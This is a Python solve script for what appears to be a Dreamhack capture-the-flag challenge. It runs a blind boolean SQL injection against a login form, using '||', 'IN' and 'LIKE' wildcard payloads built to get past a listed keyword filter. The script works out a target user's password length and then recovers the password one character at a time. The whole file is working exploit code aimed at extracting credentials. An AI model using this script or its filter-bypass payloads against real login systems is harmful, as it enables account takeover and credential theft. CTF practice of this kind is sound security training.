import requests
import string

# URL = "http://host3.dreamhack.games:9336/login" 
URL = "http://localhost:5000/login"

# filter
# banned_word=['from', 'where', 'insert', 'update', 'delete', 'join', 'substr', 'concat', 'table', 'database', 'schema', 'if', 'order', 'group', 'by', 'limit', 'offset', 'exists', 'between', 'regexp', 'binary', 'file', 'not', 'rlike', 'left', 'right', 'mid', 'lpad', 'rpad', 'char', 'user', 'version', 'session', 'sleep', 'benchmark', 'hex', 'base64', '0x', "x'",'x"','admin']
# banned_letter='+-*/=:;<>.?!\\$%^~`'

chars = string.ascii_letters + string.digits + "{}_@"
ID = 2  # Target user ID (Rootsquare)
print(f"[*] ID: {ID}")

def check(payload):
    data = {
        "username": payload,
        "password": "1"
    }
    
    try:
        r = requests.post(URL, data=data)
        if "No Hack" in r.text:
            print(f"[-] WAF Blocked: {payload}")
            return False
        if "Invalid User ID or Password" not in r.text:
            return True
    except Exception as e:
        print(f"[-] Error: {e}")
    return False

length = 0
for i in range(1, 50):
    wildcards = '_' * i
    payload = f"Foo' || id IN ({ID}) && password LIKE '{wildcards}' #"
    
    if check(payload):
        length = i
        print(f"[+] Found password length: {length}")
        break

if length == 0:
    print(f"[-] Could not determine length. Check if ID={ID} is correct.")
    exit()

password = ""

for i in range(length):
    found = False
    for c in chars:
        # Construct mask: Known + Guess + Remaining_Underscores
        remaining_len = length - 1 - i
        mask = password + c + ('_' * remaining_len)
        
        payload = f"Foo' || id IN ({ID}) && password LIKE '{mask}' #"
        if check(payload):
            password += c
            print(f"\r[+] Found: {password}", end="", flush=True)
            found = True
            break
    
    if not found:
        print(f"\n[-] Failed to find char at index {i}. Trying next...")
        password += "?"

print(f"\n[+] Final Password: {password}")